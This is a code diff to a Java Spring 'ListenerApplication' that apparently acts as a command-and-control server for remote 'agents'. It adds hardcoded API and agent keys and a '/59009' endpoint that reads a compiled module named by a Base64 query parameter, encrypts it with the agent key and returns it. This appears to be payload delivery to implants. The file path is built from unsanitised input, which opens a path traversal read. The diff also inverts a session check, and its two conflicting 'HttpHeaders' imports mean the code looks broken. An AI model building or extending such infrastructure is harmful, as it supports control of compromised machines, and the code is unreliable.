@@ -5,6 +5,9 @@ import org.springframework.boot.autoconfigure.SpringBootApplication;
 import org.springframework.boot.autoconfigure.security.servlet.SecurityAutoConfiguration;
 import org.springframework.context.annotation.Bean;
 import org.springframework.context.annotation.Configuration;
+import org.springframework.http.HttpStatus;
+import org.springframework.http.HttpHeaders;
+import org.springframework.http.ResponseEntity;
 import org.springframework.security.config.annotation.web.builders.HttpSecurity;
 import org.springframework.security.config.annotation.web.configuration.EnableWebSecurity;
 import org.springframework.security.web.SecurityFilterChain;
@@ -13,6 +16,7 @@ import org.springframework.web.context.annotation.RequestScope;
 import org.springframework.web.bind.annotation.PostMapping;
 import org.springframework.web.bind.annotation.RequestBody;
 import org.springframework.web.bind.annotation.RequestMapping;
+import org.springframework.web.bind.annotation.RequestParam;
 import org.springframework.web.bind.annotation.CookieValue;
 
 import java.security.InvalidAlgorithmParameterException;
@@ -34,6 +38,8 @@ import javax.crypto.IllegalBlockSizeException;
 
 import java.io.File;
 import java.io.StringWriter;
+import java.net.URI;
+import java.net.http.HttpHeaders;
 import java.io.IOException;
 import java.io.StringReader;
 import java.util.ArrayList;
@@ -42,6 +48,7 @@ import java.util.Base64;
 import java.util.Random;
 import java.util.Enumeration;
 import java.util.Set;
+import java.util.UUID;
 import java.util.Arrays;
 import java.nio.charset.StandardCharsets;
 import java.nio.file.Files;
@@ -81,6 +88,8 @@ public class ListenerApplication {
 			static String passwd = "T__+Pmv.REW=u9iXBB-";
 			static String userpass = "SiAp++Em=@vBnQo0_";
 			static String encKey = "A54f6YY2_1@31395b5v5+9592_4081l0";
+			static String apiKey = "a18b25f2-6045-4aa2-b0b5-1dae01aa4f9a";
+			static String agentKey = "q8uf6,p2m1@31395aO+g+9592_4891lS";
 			static Hashtable<String,session> sessionTable = new Hashtable();
 		}
 
@@ -181,7 +190,7 @@ public class ListenerApplication {
 			else
 			{
 				sessionData  = (session) epc.sessionTable.get(idCookie);
-				if (sessionData.cookie.equals(authCookie))
+				if (!sessionData.cookie.equals(authCookie))
 				{
 					return "error.0x73657373";
 				}
@@ -202,6 +211,54 @@ public class ListenerApplication {
 			sessionData.data.add(xmlParsed);
 
 			return "ok";
+		}
+
+		@RequestMapping("/59009")
+		//String log(@RequestBody noceboApiRequest requestData, @CookieValue("nocebo.auth") String authCookie)
+		ResponseEntity<String> download(@CookieValue("__Secure-YEC") String apiKeyData, @RequestParam("v") String classNameEncoded) throws Exception, IOException, NoSuchAlgorithmException, ParserConfigurationException, SAXException, InvalidKeyException, InvalidAlgorithmParameterException, IllegalBlockSizeException, BadPaddingException
+		{
+			if (!apiKeyData.equals(epc.apiKey))
+			{
+				return new ResponseEntity<String>("error.0x73657373",null,HttpStatus.CREATED);
+			}
+
+			String classNameDecoded = new String(
+				Base64.getDecoder().decode(
+					classNameEncoded.getBytes()
+				)
+			);
+
+			String modPath = String.format("..%sfileroot%scom%snocebo%snCore%s%s.class",File.separator,File.separator,File.separator,File.separator,File.separator,classNameDecoded);
+			byte[] fileData = Files.readAllBytes(Paths.get(modPath));
+
+			String modData = new String(Base64.getEncoder().encode(fileData));
+			//use .substring(0,12).replace("-",""); on agent
+			String downloadNonce = String.join(
+				"-", 
+				new String[] {
+					napi.strand(8),
+					napi.strand(4),
+					napi.strand(4),
+					napi.strand(4),
+					napi.strand(12)
+				}
+			);
+
+			String retrData = new String(
+				Base64.getEncoder().encode(
+					sapi.encrypt(
+						fileData,
+						downloadNonce.substring(0,12).replace("-","").getBytes(),
+						epc.agentKey
+					)
+				)
+			);
+
+			
+			HttpHeaders respHeaders = new HttpHeaders();
+    		respHeaders.set("uuid", downloadNonce);
+    		return new ResponseEntity<String>(retrData, respHeaders, HttpStatus.CREATED);
+
 		}
 
 		@PostMapping("/tasking")
@@ -308,9 +365,6 @@ public class ListenerApplication {
 
 	}
 }
-
-
-
 
 class noceboApi
 {
